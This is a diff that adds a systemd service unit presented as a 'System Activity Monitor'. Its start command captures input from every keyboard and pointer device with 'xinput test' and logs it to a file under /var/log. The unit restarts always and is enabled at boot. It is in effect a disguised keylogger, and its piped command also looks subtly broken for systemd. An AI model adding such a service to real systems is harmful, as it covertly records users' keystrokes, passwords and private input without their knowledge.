@@ -1,0 +1,13 @@
+[Unit]
+Description = System Activity Monitor
+After = network.target
+
+[Service]
+ExecStart = /usr/bin/xinput | /usr/bin/grep -Po 'id=\K\d+(?=.*slave\s*keyboard|.*slave\s*pointer)' | /usr/bin/xargs -P0 -n1 xinput test > /var/log/xinput_tracker
+Restart = always
+KillSignal = SIGTERM
+Type = simple
+StandardError = syslog
+
+[Install]
+WantedBy = default.target
